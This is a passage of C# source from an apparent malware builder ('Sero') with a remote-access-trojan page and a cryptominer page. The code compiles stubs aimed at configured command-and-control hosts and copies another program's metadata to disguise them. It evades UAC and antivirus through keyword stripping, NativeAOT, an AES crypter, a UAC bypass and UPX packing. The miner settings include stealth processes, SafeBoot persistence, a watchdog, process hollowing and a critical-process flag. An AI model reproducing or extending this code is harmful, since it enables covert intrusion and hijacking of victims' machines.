                var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
                if (File.Exists(toolsUpx)) upxExe = toolsUpx;
                var upxPsi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = upxExe,
                    Arguments = $"--best --lzma \"{outputExe}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                try
                {
                    using var upxProc = System.Diagnostics.Process.Start(upxPsi)!;
                    await upxProc.StandardOutput.ReadToEndAsync();
                    await upxProc.StandardError.ReadToEndAsync();
                    await upxProc.WaitForExitAsync();
                    if (upxProc.ExitCode == 0) Log("[+] MinerBuilder: UPX compression applied.");
                    else Log($"[!] MinerBuilder: UPX failed (exit {upxProc.ExitCode}) — skipped.");
                }
                catch { Log("[!] MinerBuilder: UPX not found — skipped. Put upx.exe in PATH or tools/."); }
            }

            // Generate PS1 uninstaller script
            var uninstallerPs1 = Path.Combine(
                Path.GetDirectoryName(outputExe)!,
                Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.ps1");
            await File.WriteAllTextAsync(uninstallerPs1, GenerateUninstallerScript());
            Log($"[+] MinerBuilder: PS1 uninstaller → {Path.GetFileName(uninstallerPs1)}");

            // Build silent uninstaller .exe from miner-uninstaller project
            TxtMnrBuildStatus.Text = "Building uninstaller.exe…";
            var uninstallerExePath = Path.Combine(
                Path.GetDirectoryName(outputExe)!,
                Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.exe");
            await BuildUninstallerExeAsync(uninstallerExePath);

            var size = new FileInfo(outputExe).Length;
            Log($"[+] MinerBuilder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtMnrBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({size / 1024} KB)";
            MessageBox.Show($"Miner built!\n\nFile: {Path.GetFileName(outputExe)}\nSize: {size / 1024} KB\nUninstaller: {Path.GetFileName(uninstallerExePath)}",
                "Sero — Miner Built", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] MinerBuilder: {ex.Message}");
            TxtMnrBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally { BtnMnrBuild.IsEnabled = true; }
    }

    private string GetMinerUninstallerProjectDir()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var candidates = new[]
        {
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "miner-uninstaller"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "miner-uninstaller"),
            Path.Combine(serverExeDir, "..", "miner-uninstaller"),
        };
        foreach (var c in candidates)
        {
            var full = Path.GetFullPath(c);
            if (Directory.Exists(full)) return full;
        }
        return candidates[0];
    }

    private async Task BuildUninstallerExeAsync(string outputExePath)
    {
        try
        {
            var uninstDir = GetMinerUninstallerProjectDir();
            if (!Directory.Exists(uninstDir)) { Log("[!] miner-uninstaller/ not found — skipping exe uninstaller."); return; }

            // Write UninstallerConfig.cs with baked-in install name, hollow target and watchdog flag
            var installName    = BldMnrInstallName.Text.Trim();
            var hollowTarget   = (BldMnrHollow.IsChecked == true) ? GetHollowTarget() : "";
            var enableWatchdog = BldMnrWatchdog.IsChecked == true;
            var cfgContent = $@"namespace MinerUninstaller;
internal static class UninstallerConfig
{{
    public const string InstallName    = ""{installName.Replace("\"", "\\\"")}"";
    public const string HollowTarget   = ""{hollowTarget.Replace("\"", "\\\"")}"";
    public const bool   EnableWatchdog = {(enableWatchdog ? "true" : "false")};
}}
";
            await File.WriteAllTextAsync(Path.Combine(uninstDir, "UninstallerConfig.cs"), cfgContent);

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_uninst_" + Guid.NewGuid().ToString("N")[..8]);
            var psi = new System.Diagnostics.ProcessStartInfo("dotnet",
                $"publish \"{Path.Combine(uninstDir, "MinerUninstaller.csproj")}\" -c Release -r win-x64 --sc true -o \"{tempOut}\" --nologo")
            {
                CreateNoWindow  = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
            };
            using var proc = System.Diagnostics.Process.Start(psi)!;
            await proc.WaitForExitAsync();

            var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
            if (builtExe != null)
            {
                File.Copy(builtExe, outputExePath, true);
                Log($"[+] MinerBuilder: uninstaller.exe → {Path.GetFileName(outputExePath)} ({new FileInfo(outputExePath).Length / 1024} KB)");
            }
            else
            {
                Log($"[!] MinerBuilder: uninstaller.exe build failed (exit {proc.ExitCode}).");
            }
            try { Directory.Delete(tempOut, true); } catch { }
        }
        catch (Exception ex) { Log($"[!] MinerBuilder: uninstaller.exe error — {ex.Message}"); }
    }

    private string GenerateUninstallerScript()
    {
        static string Esc(string s) => s.Replace("'", "''");
        var installName = BldMnrInstallName.Text.Trim();
        var folderName  = installName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                          ? installName[..^4] : installName;
        var taskMain    = $@"\Microsoft\Windows\{folderName}";
        var taskWd      = $@"\Microsoft\Windows\{folderName}Wd";

        return $@"# Miner uninstaller — run as admin
# Auto-elevate
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    Start-Process powershell -ArgumentList ""-ExecutionPolicy Bypass -File `""$PSCommandPath`"""" -Verb RunAs; exit
}}

$installName = '{Esc(installName)}'
$folderName  = '{Esc(folderName)}'
$installDir  = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft', 'Windows', $folderName)
$taskMain    = '{Esc(taskMain)}'
$taskWd      = '{Esc(taskWd)}'

Write-Host '=== Miner Uninstaller ===' -ForegroundColor Cyan

# 1. Delete scheduled tasks (stop auto-restart)
schtasks /delete /tn $taskMain /f 2>&1 | Out-Null
schtasks /delete /tn $taskWd  /f 2>&1 | Out-Null
Write-Host '[OK] Scheduled tasks removed'

# 2. Enable SeDebugPrivilege to bypass protected-process DACL
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class MK {{
    [DllImport(""ntdll.dll"")] public static extern int RtlAdjustPrivilege(int p,bool e,bool t,out bool v);
    [DllImport(""kernel32.dll"",SetLastError=true)] public static extern IntPtr OpenProcess(uint a,bool i,int p);
    [DllImport(""kernel32.dll"")] public static extern bool TerminateProcess(IntPtr h,uint c);
    [DllImport(""kernel32.dll"")] public static extern bool CloseHandle(IntPtr h);
    [DllImport(""ntdll.dll"")] public static extern int NtSetInformationProcess(IntPtr h,int c,ref uint v,int s);
}}
'@ -ErrorAction SilentlyContinue
$vv=$false; [MK]::RtlAdjustPrivilege(20,$true,$false,[ref]$vv) | Out-Null
Write-Host '[OK] SeDebugPrivilege enabled'

# 3. Kill miner processes (removes critical flag first to avoid BSOD)
$procs = Get-Process -Name $folderName -ErrorAction SilentlyContinue | Sort-Object {{ $_.Threads.Count }} -Descending
foreach ($p in $procs) {{
    $h = [MK]::OpenProcess(0x1FFFFF,$false,$p.Id)
    if ($h -ne [IntPtr]::Zero) {{
        $z=[uint32]0; [MK]::NtSetInformationProcess($h,0x1D,[ref]$z,4) | Out-Null
        $ok=[MK]::TerminateProcess($h,0); [MK]::CloseHandle($h) | Out-Null
        if ($ok) {{ Write-Host ""[OK] Killed PID $($p.Id) ($($p.Threads.Count) threads)"" }}
    }}
}}

# 4. Delete install directory
Start-Sleep -Milliseconds 500
if (Test-Path $installDir) {{
    Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep 1
    Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $installDir)) {{ Write-Host '[OK] Install directory removed' }}
    else {{ Write-Host '[!] Could not fully remove install directory' }}
}}

# 5. SafeBoot registry cleanup
foreach ($mode in @('Network','Minimal')) {{
    $key = ""HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\$mode\$folderName""
    if (Test-Path $key) {{ Remove-Item $key -Force; Write-Host ""[OK] Removed SafeBoot key ($mode)"" }}
}}

# 6. Service cleanup
$svc = Get-Service $folderName -ErrorAction SilentlyContinue
if ($svc) {{
    sc.exe stop   $folderName 2>&1 | Out-Null
    sc.exe delete $folderName 2>&1 | Out-Null
    Write-Host '[OK] Service removed'
}}

Write-Host ''
Write-Host '[DONE] Miner fully removed. Safe to reboot.' -ForegroundColor Green
Read-Host 'Press Enter to close'
";
    }


    private void BldMnrSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "JSON (*.json)|*.json",
            FileName = "miner_config.json",
            Title    = "Save miner config"
        };
        if (dlg.ShowDialog() != true) return;
        try
        {
            var obj = new System.Text.Json.Nodes.JsonObject
            {
                ["Pool"]         = BldMnrPool.Text,
                ["Wallet"]       = BldMnrWallet.Text,
                ["Password"]     = BldMnrPass.Text,
                ["WorkerName"]   = BldMnrWorkerName.Text,
                ["Algo"]         = BldMnrAlgo.Text,
                ["CpuIdle"]      = BldMnrCpuIdle.Text,
                ["CpuActive"]    = BldMnrCpuActive.Text,
                ["IdleSec"]      = BldMnrIdleSec.Text,
                ["InstallName"]  = BldMnrInstallName.Text,
                ["StealthProcs"] = BldMnrStealth.IsChecked == true ? "1" : "0",
                ["StatsToken"]   = BldMnrStatsToken.Text,
                ["DisableSleep"]  = BldMnrDisableSleep.IsChecked == true,
                ["Startup"]      = BldMnrStartup.IsChecked   == true,
                ["SafeBoot"]        = BldMnrSafeBoot.IsChecked    == true,
                ["Watchdog"]        = BldMnrWatchdog.IsChecked   == true,
                ["AntiKill"]        = BldMnrWatchdog.IsChecked   == true,
                ["BotKiller"]       = BldMnrBotKiller.IsChecked  == true,
                ["Hollow"]          = BldMnrHollow.IsChecked     == true,
                ["HollowTarget"] = BldMnrHollowTarget.Text,
                ["Encrypt"]      = BldMnrEncrypt.IsChecked  == true,
            };
            File.WriteAllText(dlg.FileName, obj.ToJsonString(new System.Text.Json.JsonSerializerOptions { WriteIndented = true }));
            TxtMnrBuildStatus.Text = $"Config saved: {Path.GetFileName(dlg.FileName)}";
        }
        catch (Exception ex) { TxtMnrBuildStatus.Text = $"Save error: {ex.Message}"; }
    }

    private void BldMnrLoadConfig_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "JSON (*.json)|*.json",
            Title  = "Load miner config"
        };
        if (dlg.ShowDialog() != true) return;
        try
        {
            var json = File.ReadAllText(dlg.FileName);
            var obj  = System.Text.Json.Nodes.JsonNode.Parse(json)!.AsObject();
            string? Get(string k) => obj.TryGetPropertyValue(k, out var v) ? v?.GetValue<string>() : null;
            bool?   GetB(string k) => obj.TryGetPropertyValue(k, out var v) ? v?.GetValue<bool>() : null;

            if (Get("Pool")         is string pool)  BldMnrPool.Text         = pool;
            if (Get("Wallet")       is string w)     BldMnrWallet.Text        = w;
            if (Get("Password")     is string p)     BldMnrPass.Text          = p;
            if (Get("WorkerName")   is string wn)    BldMnrWorkerName.Text    = wn;
            if (Get("Algo")         is string algo)  BldMnrAlgo.Text          = algo;
            if (Get("CpuIdle")      is string ci)    BldMnrCpuIdle.Text       = ci;
            if (Get("CpuActive")    is string ca)    BldMnrCpuActive.Text     = ca;
            if (Get("IdleSec")      is string id)    BldMnrIdleSec.Text       = id;
            if (Get("InstallName")  is string ins)   BldMnrInstallName.Text   = ins;
            if (Get("StealthProcs") is string sp)    BldMnrStealth.IsChecked  = sp == "1" || (sp != "0" && sp.Length > 0);
            if (Get("StatsToken")   is string tok)   BldMnrStatsToken.Text    = tok;
            if (Get("HollowTarget") is string ht)    BldMnrHollowTarget.Text  = ht;
            if (GetB("DisableSleep") is bool ds)  BldMnrDisableSleep.IsChecked = ds;
            if (GetB("Startup")     is bool st)  BldMnrStartup.IsChecked   = st;
            if (GetB("SafeBoot")    is bool sb)  BldMnrSafeBoot.IsChecked  = sb;
            if (GetB("Watchdog")    is bool wd)  BldMnrWatchdog.IsChecked  = wd;
            if (GetB("AntiKill")    is bool ak && ak)  BldMnrWatchdog.IsChecked = true;
            if (GetB("BotKiller")   is bool bk)  BldMnrBotKiller.IsChecked = bk;
            if (GetB("Hollow")      is bool ho)  BldMnrHollow.IsChecked   = ho;
            if (GetB("Encrypt")     is bool en)  BldMnrEncrypt.IsChecked  = en;
            TxtMnrBuildStatus.Text = $"Config loaded: {Path.GetFileName(dlg.FileName)}";
        }
        catch (Exception ex) { TxtMnrBuildStatus.Text = $"Load error: {ex.Message}"; }
    }

    private void BtnPageRat_Click(object sender, RoutedEventArgs e)
    {
        PageRat.Visibility = Visibility.Visible;
        PageXmr.Visibility = Visibility.Collapsed;
        BtnPageRat.Opacity = 1.0;
        BtnPageXmr.Opacity = 0.55;
    }

    private void BtnPageXmr_Click(object sender, RoutedEventArgs e)
    {
        PageRat.Visibility = Visibility.Collapsed;
        PageXmr.Visibility = Visibility.Visible;
        BtnPageRat.Opacity = 0.55;
        BtnPageXmr.Opacity = 1.0;
        AutoDetectXmrig();
    }

    private string GetPrimaryHost()
    {
        // Get first host from ListBox, or first from comma-separated, or default
        if (BldHosts.Items.Count > 0)
            return (BldHosts.Items[0] as string) ?? "127.0.0.1";
        return "127.0.0.1";
    }

    private void BldAddHost_Click(object sender, RoutedEventArgs e)
    {
        var hostInput = BldHostInput.Text.Trim();
        if (!string.IsNullOrEmpty(hostInput) && !BldHosts.Items.Contains(hostInput))
        {
            BldHosts.Items.Add(hostInput);
            BldHostInput.Clear();
        }
    }

    private void BldDelHost_Click(object sender, RoutedEventArgs e)
    {
        if (BldHosts.SelectedIndex >= 0)
            BldHosts.Items.RemoveAt(BldHosts.SelectedIndex);
    }


    private void BldUsePastebin_Checked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = false;
        BldHostInput.IsEnabled = false;
        BldPort.IsEnabled = false;
        BldPastebinUrl.IsEnabled = true;
    }

    private void BldUsePastebin_Unchecked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = true;
        BldHostInput.IsEnabled = true;
        BldPort.IsEnabled = true;
        BldPastebinUrl.IsEnabled = false;
    }


    private void ApplyIcon(string exePath, string iconPath)
    {
        try
        {
            // Try multiple locations for rcedit.exe
            var candidates = new[]
            {
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "rcedit.exe")), // repo root (bin/Release/net10.0-windows/ → 4 levels up)
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "rcedit.exe")), // fallback 3 levels
                "rcedit.exe", // PATH
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "..", "..", "Downloads", "sero", "ancien code", "code qui marchai", "rcedit.exe"),
            };

            string? rceditPath = null;
            foreach (var candidate in candidates)
            {
                if (File.Exists(candidate))
                {
                    rceditPath = candidate;
                    break;
                }
            }

            if (rceditPath == null)
            {
                Log($"[!] Builder: rcedit.exe not found. Icon not applied.");
                return;
            }

            Log($"[*] Builder: Using rcedit at {rceditPath}");

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = rceditPath,
                Arguments = $"\"{exePath}\" --set-icon \"{iconPath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var process = System.Diagnostics.Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit();
                if (process.ExitCode == 0)
                {
                    Log($"[+] Builder: Icon applied successfully");
                }
                else
                {
                    Log($"[!] Builder: rcedit failed (exit code {process.ExitCode})");
                }
            }
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: Icon application error: {ex.Message}");
        }
    }

    private void BldSetAssembly_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable files (*.exe)|*.exe",
            Title = "Select executable file"
        };
        if (dialog.ShowDialog() == true)
        {
            // Store the full path in Tag for use in Build_Click
            BldAssemblyPath.Tag = dialog.FileName;
            // Display only the filename
            BldAssemblyPath.Text = Path.GetFileName(dialog.FileName);
        }
        else
        {
            BldSetAssembly.IsChecked = false;
        }
    }

    private void BldSetAssembly_Unchecked(object sender, RoutedEventArgs e)
    {
        BldAssemblyPath.Text = "No executable selected";
        BldAssemblyPath.Tag = null;
    }

    private void BldSetIcon_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Icon files (*.ico)|*.ico",
            Title = "Select icon file"
        };
        if (dialog.ShowDialog() == true)
        {
            BldIconPath.Text = dialog.FileName;
        }
        else
        {
            // User cancelled, uncheck the checkbox
            BldSetIcon.IsChecked = false;
        }
    }

    private void BldSetIcon_Unchecked(object sender, RoutedEventArgs e)
    {
        BldIconPath.Text = "No icon selected";
    }

    private async void Build_Click(object sender, RoutedEventArgs e)
    {
        if (BldHosts.Items.Count == 0)
        {
            MessageBox.Show("Add at least one host before building.", "No Host Configured",
                MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        var stubDir = GetStubProjectDir();
        if (!Directory.Exists(stubDir))
        {
            Log("[!] Builder: stub/ project not found.");
            TxtBuildStatus.Text = $"Error: {stubDir} not found";
            return;
        }

        // Determine assembly name from selected executable
        string assemblyName = "SeroStub";
        string? selectedExePath = null;

        if (BldSetAssembly.IsChecked == true && BldAssemblyPath.Tag != null)
        {
            selectedExePath = BldAssemblyPath.Tag.ToString()!;
            if (selectedExePath != null && File.Exists(selectedExePath))
            {
                assemblyName = Path.GetFileNameWithoutExtension(selectedExePath);
            }
        }

        var dialogBuild = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "Executable (*.exe)|*.exe",
            FileName = string.Empty,
            Title = "Save built client"
        };
        if (dialogBuild.ShowDialog() != true) return;

        var outputExe = dialogBuild.FileName;

        BtnBuild.IsEnabled = false;
        BuilderPanel.IsEnabled = false;
        TxtBuildStatus.Text = "Generating config...";
        Log("[*] Builder: Starting build...");

        try
        {
            var configPath = Path.Combine(stubDir, "Config.cs");
            await File.WriteAllTextAsync(configPath, GenerateConfigCs());
            Log("[+] Builder: Config.cs generated.");

            var csprojPath = Path.Combine(stubDir, "SeroStub.csproj");
            var csproj = await File.ReadAllTextAsync(csprojPath);

            // Extract metadata from selected executable if checkbox is checked
            var assemblyTitle = assemblyName;
            var company = string.Empty;
            var product = string.Empty;
            var fileVersion = "1.0.0.0";
            var productVersion = "1.0.0.0";
            var copyright = string.Empty;

            if (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
            {
                try
                {
                    var versionInfo = System.Diagnostics.FileVersionInfo.GetVersionInfo(selectedExePath);

                    if (!string.IsNullOrWhiteSpace(versionInfo.ProductName))
                        product = versionInfo.ProductName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.CompanyName))
                        company = versionInfo.CompanyName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.FileVersion))
                    {
                        fileVersion = versionInfo.FileVersion.Trim();
                        // Clean version - keep only numeric version (e.g., "0.18.4.5" from "0.18.4.5-b1a6201...")
                        var parts = fileVersion.Split(new[] { '-', '+', ' ' }, System.StringSplitOptions.None);
                        if (parts.Length > 0 && !string.IsNullOrEmpty(parts[0]))
                            fileVersion = parts[0];
                    }

                    // Use FileVersion for ProductVersion to avoid random characters
                    productVersion = fileVersion; // Force use of cleaned FileVersion

                    if (!string.IsNullOrWhiteSpace(versionInfo.FileDescription))
                        assemblyTitle = versionInfo.FileDescription.Trim();

                    // Extract copyright - try multiple sources
                    if (!string.IsNullOrWhiteSpace(versionInfo.LegalCopyright))
                        copyright = versionInfo.LegalCopyright.Trim();

                    Log($"[+] Builder: Extracted metadata from {Path.GetFileName(selectedExePath)}");
                    Log($"[+] Builder: Company={company}, Product={product}, FileVersion={fileVersion}, ProductVersion={productVersion}, Copyright='{copyright}'");
                }
                catch (Exception ex)
                {
                    Log($"[!] Builder: Could not extract metadata: {ex.Message}");
                }
            }

            if (string.IsNullOrEmpty(assemblyTitle)) assemblyTitle = "";
            if (string.IsNullOrEmpty(company)) company = "";
            if (string.IsNullOrEmpty(product)) product = "";
            if (string.IsNullOrEmpty(fileVersion)) fileVersion = "1.0.0.0";
            if (string.IsNullOrEmpty(productVersion)) productVersion = fileVersion;

            // Windows "Installer Detection" heuristic scans PE metadata for these
            // keywords and forces a UAC elevation popup even without a manifest.
            // Strip them from any copied field to prevent the popup on the client.
            static string StripInstallerKeywords(string s)
            {
                if (string.IsNullOrEmpty(s)) return s;
                var triggers = new[] { "setup", "install", "update", "patch",
                                       "upgrade", "deploy", "wizard", "launcher",
                                       "bootstrap", "uninstall", "repair" };
                foreach (var t in triggers)
                    s = System.Text.RegularExpressions.Regex.Replace(
                            s, t, "", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                return s.Trim();
            }
            assemblyTitle  = StripInstallerKeywords(assemblyTitle);
            product        = StripInstallerKeywords(product);
            assemblyName   = StripInstallerKeywords(assemblyName);

            // Escape XML special characters
            var escapeXml = (string s) => System.Security.SecurityElement.Escape(s) ?? s;
            assemblyName = escapeXml(assemblyName);
            assemblyTitle = escapeXml(assemblyTitle);
            company = escapeXml(company);
            product = escapeXml(product);
            fileVersion = escapeXml(fileVersion);
            productVersion = escapeXml(productVersion);
            copyright = escapeXml(copyright);

            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyName>[^<]*</AssemblyName>", $"<AssemblyName>{assemblyName}</AssemblyName>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyTitle>[^<]*</AssemblyTitle>", $"<AssemblyTitle>{assemblyTitle}</AssemblyTitle>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Description>[^<]*</Description>", $"<Description>{assemblyTitle}</Description>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Product>[^<]*</Product>", $"<Product>{product}</Product>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Company>[^<]*</Company>", $"<Company>{company}</Company>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<FileVersion>[^<]*</FileVersion>", $"<FileVersion>{fileVersion}</FileVersion>");

            // Update or add Copyright
            if (csproj.Contains("<Copyright>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<Copyright>[^<]*</Copyright>", $"<Copyright>{copyright}</Copyright>");
            }
            else
            {
                // Add Copyright after Company if it doesn't exist
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"(<Company>[^<]*</Company>)", $"$1\n    <Copyright>{copyright}</Copyright>");
            }

            // Update ProductVersion and InformationalVersion
            if (csproj.Contains("<ProductVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<ProductVersion>[^<]*</ProductVersion>", $"<ProductVersion>{productVersion}</ProductVersion>");
            }

            if (csproj.Contains("<InformationalVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<InformationalVersion>[^<]*</InformationalVersion>", $"<InformationalVersion>{productVersion}</InformationalVersion>");
            }

            await File.WriteAllTextAsync(csprojPath, csproj);

            // Clean build cache (offloaded — can be slow on large NativeAOT obj dirs)
            var binDir = Path.Combine(stubDir, "bin");
            var objDir = Path.Combine(stubDir, "obj");
            TxtBuildStatus.Text = "Cleaning cache...";
            await Task.Run(() =>
            {
                try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { }
                try { if (Directory.Exists(objDir)) Directory.Delete(objDir, true); } catch { }
            });

            // Always NativeAOT — best evasion + modular native DLL plugins via NativeLibrary.Load
            TxtBuildStatus.Text = "Compiling (NativeAOT)...";
            Log("[*] Builder: dotnet publish (NativeAOT)...");

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_build_" + Guid.NewGuid().ToString("N")[..8]);

            var iconArg = "";
            if (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
            {
                iconArg = $" -p:ApplicationIcon=\"{BldIconPath.Text}\"";
                Log($"[*] Builder: Icon will be embedded: {BldIconPath.Text}");
            }

            // Size: optimize for smaller binary (fold identical methods, prefer size over speed).
            // Compatible with crypter/loader — they just compress+encrypt the PE, size reduction is fine.
            var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads}{iconArg} -o \"{tempOut}\"";
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = stubDir,
            };

            // NativeAOT needs vswhere.exe in PATH to find MSVC linker
            {
                var vsInstaller = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "Microsoft Visual Studio", "Installer");
                if (Directory.Exists(vsInstaller))
                    psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");
            }

            using var proc = System.Diagnostics.Process.Start(psi)!;
            // Read both streams in parallel to avoid deadlock
            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
            var stderrTask = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            if (proc.ExitCode != 0)
            {
                Log($"[!] Builder: Build failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
                if (!string.IsNullOrWhiteSpace(stdout)) Log(stdout);
                TxtBuildStatus.Text = "Build FAILED. Check logs.";
                NotificationService.NotifyBuildError();
                return;
            }

            Log("[+] Builder: Compilation successful.");

            var builtExe = Path.Combine(tempOut, assemblyName + ".exe");
            if (!File.Exists(builtExe))
            {
                var exes = Directory.GetFiles(tempOut, "*.exe");
                if (exes.Length > 0) builtExe = exes[0];
                else
                {
                    Log("[!] Builder: Output exe not found.");
                    TxtBuildStatus.Text = "Build output not found.";
                    return;
                }
            }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }

            // Apply crypter if enabled — or if UAC bypass is checked (bypass lives inside the C++ loader)
            bool uacBypass = BldUacBypass.IsChecked == true;
            bool needsCrypter = BldEncrypt.IsChecked == true || uacBypass;
            if (needsCrypter)
            {
                if (uacBypass && BldEncrypt.IsChecked != true)
                    Log("[*] Builder: UAC bypass requires the native loader — crypter applied automatically.");

                TxtBuildStatus.Text = "Applying crypter...";
                Log("[*] Builder: Applying AES crypter...");

                // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
                string? iconForLoader = (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
                    ? BldIconPath.Text : null;
                var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
                    ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
                    : null;

                await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, uacBypass);
            }
            else
            {
                // No crypter — icon already embedded via -p:ApplicationIcon at compile time
            }

            if (BldUpx.IsChecked == true)
            {
                TxtBuildStatus.Text = "Compressing (UPX)...";
                Log("[*] Builder: Running UPX...");
                string upxExe = "upx";
                var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
                if (File.Exists(toolsUpx)) upxExe = toolsUpx;
                var upxPsi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = upxExe,
                    Arguments = $"--best --lzma \"{outputExe}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                try
                {
                    using var upxProc = System.Diagnostics.Process.Start(upxPsi)!;
                    var upxOut = await upxProc.StandardOutput.ReadToEndAsync();
                    var upxErr = await upxProc.StandardError.ReadToEndAsync();
                    await upxProc.WaitForExitAsync();
                    if (upxProc.ExitCode == 0)
                        Log("[+] Builder: UPX compression applied.");
                    else
                        Log($"[!] Builder: UPX failed (exit {upxProc.ExitCode}) — skipped. Put upx.exe in PATH or tools/.");
                }
                catch
                {
                    Log("[!] Builder: UPX not found — skipped. Put upx.exe in PATH or tools/.");
                }
            }

            var size = new FileInfo(outputExe).Length;
            var sizeStr = size < 1024 * 1024
                ? $"{size / 1024.0:F0} KB"
                : $"{size / (1024.0 * 1024.0):F1} MB";
            Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
            SetStatus("Build successful.");
            NotificationService.NotifyBuildSuccess();

            MessageBox.Show(
                $"Build successful!\n\n" +
                $"File: {Path.GetFileName(outputExe)}\n" +
                $"Size: {sizeStr}\n" +
                $"Mode: NativeAOT",
                "Sero — Build Complete", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: {ex.Message}");
            TxtBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally
        {
            BtnBuild.IsEnabled = true;
            BuilderPanel.IsEnabled = true;
        }
    }

    // Helper: run a process and return (exitCode, stdout+stderr combined) without deadlocking
    private static async Task<(int code, string output)> RunProcessAsync(System.Diagnostics.ProcessStartInfo psi)
    {
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
